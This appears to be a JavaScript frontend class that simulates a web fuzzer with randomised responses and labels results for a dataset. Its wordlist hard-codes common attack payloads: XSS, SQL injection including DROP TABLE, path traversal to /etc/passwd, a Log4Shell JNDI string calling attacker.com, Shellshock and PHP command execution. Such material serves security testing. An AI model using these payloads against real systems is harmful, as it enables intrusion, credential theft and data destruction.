
// WebFuzzer simulation for the frontend
// This simulates the Python WebFuzzer class functionality

export class WebFuzzer {
  constructor(targetUrl, wordlistFile) {
    this.targetUrl = targetUrl;
    this.wordlistFile = wordlistFile;
    this.wordlist = [];
    this.logs = [];
    this.reports = [];
    this.dataset = [];
    this.scanActive = false;
    this.scanProgress = 0;
    this.payloadsProcessed = 0;
    this.totalPayloads = 0;
  }

  logActivity(message) {
    const logEntry = {
      timestamp: new Date().toISOString(),
      message,
      type: 'activity'
    };
    this.logs.push(logEntry);
    console.log(`[Activity] ${message}`);
    return logEntry;
  }

  logReport(reportData) {
    const reportEntry = {
      timestamp: new Date().toISOString(),
      data: reportData,
      type: 'report'
    };
    this.reports.push(reportEntry);
    console.log(`[Report] New report added`);
    return reportEntry;
  }

  async loadWordlist() {
    // Simulate loading wordlist
    this.logActivity(`Loading wordlist from ${this.wordlistFile}...`);
    
    // Simulate network delay
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // Sample payloads for simulation
    this.wordlist = [
      "<script>alert(1)</script>",
      "' OR 1=1 --",
      "../../etc/passwd",
      "; DROP TABLE users;",
      "<img src=x onerror=alert('XSS')>",
      "admin' --",
      "1'; SELECT * FROM users; --",
      "UNION SELECT username, password FROM users",
      "%00../../../etc/passwd",
      "' UNION SELECT NULL, version() --",
      "<iframe src=\"javascript:alert('XSS');\"></iframe>",
      "${jndi:ldap://attacker.com/a}",
      "() { :; }; /bin/bash -c 'cat /etc/passwd'",
      "||ping -c 21 127.0.0.1||",
      "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->",
      "<?php system('cat /etc/passwd'); ?>",
      "><svg onload=alert(1)>",
      "' OR '1'='1",
      "1 OR 1=1",
      "1' OR '1' = '1",
      "' OR '' = '",
      "1' OR 1 = 1 -- -",
      "' OR 1 = 1 -- -",
      "admin' --",
      "admin' #",
      "' UNION SELECT 1, username, password, 1 FROM users; --",
      "1'; DROP TABLE users; --"
    ];
    
    this.totalPayloads = this.wordlist.length;
    this.logActivity(`Loaded ${this.wordlist.length} payloads from wordlist.`);
    return this.wordlist;
  }

  initializeDataset() {
    this.dataset = [];
    this.logActivity("Dataset initialized.");
  }

  saveToDataset(payload, responseCode, alertDetected, errorDetected, bodyWordCountChanged) {
    // Assign label based on conditions (same as Python code logic)
    let label = "safe";
    if (responseCode >= 500 || errorDetected) {
      label = "malicious";
    } else if (alertDetected) {
      label = "suspicious";
    }

    const dataEntry = {
      label,
      payload,
      response_code: responseCode,
      alert_detected: alertDetected,
      error_detected: errorDetected,
      body_word_count_changed: bodyWordCountChanged,
      timestamp: new Date().toISOString()
    };
    
    this.dataset.push(dataEntry);
    this.logActivity(`Data saved: ${label}, ${payload}, ${responseCode}, ${alertDetected}, ${errorDetected}, ${bodyWordCountChanged}`);
    return dataEntry;
  }

  async startFuzzing(onProgressUpdate, onComplete) {
    this.scanActive = true;
    this.scanProgress = 0;
    this.payloadsProcessed = 0;
    
    await this.loadWordlist();
    this.initializeDataset();
    
    this.logActivity("Starting fuzzing process...");
    this.logActivity(`Target URL: ${this.targetUrl}`);
    
    // Simulate scanning process
    for (const payload of this.wordlist) {
      if (!this.scanActive) {
        this.logActivity("Fuzzing process stopped manually.");
        break;
      }
      
      await this.processPayload(payload);
      this.payloadsProcessed++;
      this.scanProgress = (this.payloadsProcessed / this.totalPayloads) * 100;
      
      if (onProgressUpdate) {
        onProgressUpdate(this.scanProgress, this.payloadsProcessed, this.totalPayloads);
      }
      
      // Add small delay to simulate processing time
      await new Promise(resolve => setTimeout(resolve, 300 + Math.random() * 700));
    }
    
    this.scanActive = false;
    this.logActivity("Fuzzing process completed.");
    
    if (onComplete) {
      onComplete(this.dataset, this.logs, this.reports);
    }
    
    return {
      dataset: this.dataset,
      logs: this.logs,
      reports: this.reports
    };
  }

  async processPayload(payload) {
    // Simulate processing a single payload
    this.logActivity(`Processing payload: ${payload}`);
    
    // Simulate response characteristics
    const responseCode = Math.random() > 0.7 
      ? Math.floor(Math.random() * 100) + 400 
      : Math.floor(Math.random() * 100) + 200;
    
    const alertDetected = Math.random() > 0.7;
    const errorDetected = responseCode >= 500;
    const bodyWordCountChanged = Math.random() > 0.5;
    
    // Log details about the payload test
    if (alertDetected) {
      this.logActivity(`Alert detected for payload: ${payload}`);
    }
    
    if (errorDetected) {
      this.logActivity(`Error detected for payload: ${payload}`);
    }
    
    if (bodyWordCountChanged) {
      this.logActivity(`Body content changed for payload: ${payload}`);
    }
    
    // Generate a unique ID for this test
    const uniqueId = 'test-' + Date.now() + '-' + Math.floor(Math.random() * 1000);
    
    // Prepare report data
    const reportData = [
      `Unique ID: ${uniqueId}`,
      `Payload: ${payload}`,
      `Response Code: ${responseCode}`,
      `Alert Detected: ${alertDetected ? 'Yes' : 'No'}`,
      `Unexpected Error Detected: ${errorDetected ? 'Yes' : 'No'}`,
      `Body Word Count Changed: ${bodyWordCountChanged ? 'Yes' : 'No'}`,
      '-'.repeat(50)
    ].join('\n');
    
    // Log the report
    this.logReport(reportData);
    
    // Save result to dataset
    const result = this.saveToDataset(payload, responseCode, alertDetected, errorDetected, bodyWordCountChanged);
    
    return {
      uniqueId,
      payload,
      responseCode,
      alertDetected,
      errorDetected,
      bodyWordCountChanged,
      result
    };
  }

  pauseScan() {
    if (this.scanActive) {
      this.scanActive = false;
      this.logActivity("Fuzzing process paused.");
      return true;
    }
    return false;
  }

  resumeScan() {
    if (!this.scanActive && this.payloadsProcessed < this.totalPayloads) {
      this.scanActive = true;
      this.logActivity("Fuzzing process resumed.");
      return true;
    }
    return false;
  }

  stopScan() {
    if (this.scanActive) {
      this.scanActive = false;
      this.logActivity("Fuzzing process stopped.");
      return true;
    }
    return false;
  }

  getDataset() {
    return this.dataset;
  }

  getLogs() {
    return this.logs;
  }

  getReports() {
    return this.reports;
  }
}
